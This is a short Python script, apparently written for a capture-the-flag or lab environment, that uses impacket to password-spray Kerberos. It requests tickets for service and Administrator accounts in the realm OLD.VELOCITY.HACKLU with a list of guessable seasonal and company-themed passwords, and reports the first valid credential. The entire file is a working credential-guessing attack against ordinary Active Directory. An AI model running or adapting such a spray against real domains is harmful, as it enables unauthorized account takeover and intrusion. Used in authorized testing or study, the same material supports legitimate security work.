import time
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal
users = ['svc_granite_sync', 'svc_test', 'Administrator']
passwords = ['Password1', 'Welcome1!', 'Welcome123!', 'Summer2024!', 'Winter2024!', 'GraniteSync2024!', 'GraniteSync123!', 'Granite2024!', 'Granite!2024!', 'OldDomain2024!', 'Velocity2024!', 'svc_granite_sync', 'svc_test']
tries = 0
for password in passwords:
    for user in users:
        tries += 1
        try:
            client = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            getKerberosTGT(client, password, 'OLD.VELOCITY.HACKLU', None, None, kdcHost='10.244.0.20')
            print(f'VALID_CREDENTIAL user={user} password={password} attempts={tries}', flush=True)
            raise SystemExit(0)
        except SystemExit: raise
        except Exception: pass
        time.sleep(0.03)
    print(f'candidate {password!r}: checked {len(users)} accounts', flush=True)
print(f'NO_VALID_SERVICE_PAIR attempts={tries}', flush=True)
